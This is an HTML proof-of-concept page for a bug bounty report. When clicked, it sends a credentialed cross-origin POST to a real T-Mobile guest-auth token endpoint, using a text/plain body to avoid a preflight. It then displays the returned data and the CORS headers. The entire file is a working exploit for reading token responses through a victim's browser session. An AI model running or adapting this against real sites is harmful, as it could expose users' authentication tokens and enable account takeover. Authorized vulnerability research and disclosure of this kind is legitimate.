<!DOCTYPE html>
<html>
<head>
    <title>CORS Bug Bounty PoC</title>
</head>
<body>

    <h1>T-Mobile CORS Test</h1>
    <button id="runBtn">Fire Fetch Request</button>
    
    <h3>Results:</h3>
    <pre id="output" style="background: #eee; padding: 10px; border: 1px solid #ccc; min-height: 50px;">
        Click the button to start...
    </pre>

    <script>
        document.getElementById('runBtn').addEventListener('click', function() {
            const output = document.getElementById('output');
            output.innerText = "Requesting...";

            const cacheBuster = '?v=' + Date.now();
            const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens' + cacheBuster;

            fetch(target, {
                method: 'POST',
                mode: 'cors',
                credentials: 'include',
                headers: {
                    'Content-Type': 'text/plain',
                    'Cache-Control': 'no-cache'
                },
                body: '{}' 
            })
            .then(response => {
                console.log("Status:", response.status);
                // Proof of the bug: check if headers exist
                console.log("ACAO:", response.headers.get('Access-Control-Allow-Origin'));
                return response.text(); 
            })
            .then(data => {
                output.innerText = data || "Success! (But body was empty)";
                console.log("Data:", data);
            })
            .catch(err => {
                output.innerText = "Bypass Failed: " + err;
                console.error("Error details:", err);
            });
        });
    </script>

</body>
</html>
